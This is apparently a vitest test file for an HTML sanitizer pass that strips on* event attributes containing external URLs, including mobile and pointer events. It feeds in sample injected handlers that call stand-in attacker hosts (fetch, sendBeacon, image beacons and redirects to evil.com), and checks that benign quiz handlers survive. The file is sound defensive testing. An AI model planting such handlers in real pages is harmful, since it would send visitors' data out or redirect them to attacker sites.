import { describe, it, expect } from 'vitest';
import { parseHtml, serializeHtml } from '../../../utils/html-dom.js';
import type { PassContext } from '../../../types.js';
import { stripEventAttrs } from '../strip-event-attrs.js';

function ctx(): PassContext {
  return { siteDir: '/site', mainHost: 'mysite.com', filePath: '/site/index.html', relPath: 'index.html', log: [], quarantine: [] };
}
function run(html: string) {
  const $ = parseHtml(html);
  stripEventAttrs($, ctx());
  return serializeHtml($);
}

describe('stripEventAttrs — все on* по префиксу, вкл. мобильные (2D-3)', () => {
  it('ontouchstart с внешним URL снимается (мобайл — раньше не проверялся)', () => {
    const out = run(`<div ontouchstart="location.href='https://evil.com/go'">x</div>`);
    expect(out).not.toContain('ontouchstart');
    expect(out).not.toContain('evil.com');
  });

  it('onpointerdown с внешним URL снимается', () => {
    expect(run(`<a onpointerdown="fetch('https://evil.com/c')">x</a>`)).not.toContain('onpointerdown');
  });

  it('onwheel с внешним URL снимается', () => {
    expect(run(`<div onwheel="new Image().src='https://t.evil/p'">x</div>`)).not.toContain('onwheel');
  });

  it('oncopy (clipboard) с внешним URL снимается', () => {
    expect(run(`<div oncopy="navigator.sendBeacon('https://evil.com/cb')">x</div>`)).not.toContain('oncopy');
  });

  it('onhashchange с внешним URL снимается', () => {
    expect(run(`<body onhashchange="location='https://evil.com'">x</body>`)).not.toContain('onhashchange');
  });

  // ── РОБАСТНОСТЬ: простые обработчики квиза остаются ──
  it('ontouchstart="nextStep()" (без URL/трекера) сохранён', () => {
    expect(run(`<button ontouchstart="nextStep()">Далее</button>`)).toContain('nextStep()');
  });

  it('onclick="show(2)" сохранён (не-регресс)', () => {
    expect(run(`<button onclick="show(2)">x</button>`)).toContain('show(2)');
  });

  it('НЕ-регресс: onclick с http-редиректом снимается', () => {
    expect(run(`<button onclick="location.href='http://evil.example/go'">Go</button>`)).not.toContain('evil.example');
  });
});
